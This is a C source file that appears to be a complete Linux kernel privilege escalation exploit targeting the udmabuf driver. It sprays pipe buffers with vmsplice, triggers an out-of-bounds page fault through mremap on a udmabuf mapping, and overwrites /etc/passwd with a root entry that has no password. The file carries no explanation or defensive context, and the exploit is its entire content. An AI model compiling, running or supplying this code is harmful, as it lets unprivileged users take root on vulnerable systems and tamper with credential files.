#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/udmabuf.h>

#define NUM_PIPE 100

char payload[] = "root:x:0:0:root:/root:/bin/sh\n";

int iter = 0;
int target_fd;
int pipefds[NUM_PIPE][2];
char *target_ptr;

void spray_pipebuf(int num)
{
    int ret;
    struct iovec iov;

    while (num--) {
        pipe(pipefds[iter]);
        iov.iov_base = target_ptr;
        iov.iov_len = 0x1000;
        ret = vmsplice(pipefds[iter][1], &iov, 1, 0);
        if (ret == -1) {
            perror("vmsplice");
            exit(1);
        }
        iter++;
    }
}

void trigger()
{
    struct udmabuf_create_list *list;
    struct udmabuf_create_item *item;
    int memfd;
    int fd;
    int ret;
    int dma_fd;
    char *buf;

    memfd = memfd_create("qq", MFD_CLOEXEC | MFD_ALLOW_SEALING);
    fcntl(memfd, F_ADD_SEALS, F_SEAL_SHRINK);
    ftruncate(memfd, 0x1000 * 65);

    fd = open("/dev/udmabuf", O_RDWR);
    list = malloc(sizeof(*list) + sizeof(*item) * 3);
    list->count = 1;
    item = &list->list[0];

    for (int i = 0; i < 1; i++) {
        item->memfd = memfd;
        item->size = 0x1000 * 65; // make kmalloc_array allocates at kmalloc-1024
        item->offset = 0x0;
    }

    spray_pipebuf(50);
    dma_fd = ioctl(fd, UDMABUF_CREATE_LIST, list);
    if (dma_fd < 0) {
        perror("ioctl UDMABUF_CREATE_LIST");
        exit(1);
    }
    spray_pipebuf(50);

    buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0);
    if (buf == MAP_FAILED) {
        perror("mmap dma_fd");
        exit(1);
    }

    buf = mremap(buf, 0x1000, 0x1000 * 129, MREMAP_MAYMOVE);
    if (buf == MAP_FAILED) {
        perror("mremap");
        exit(1);
    }
    buf[0x1000 * 128]; // trigger page fault
    memset(&buf[0x1000*128], 0, 0x1000);
    memcpy(&buf[0x1000*128], payload, sizeof(payload));
}

void prepare_etcpasswd()
{
    target_fd = open("/etc/passwd", O_RDONLY);
    target_ptr = mmap((void *)0x8787000UL, 0x1000, PROT_READ, MAP_SHARED, target_fd, 0);
}

int main()
{
    prepare_etcpasswd();
    trigger();
    return 0;
}
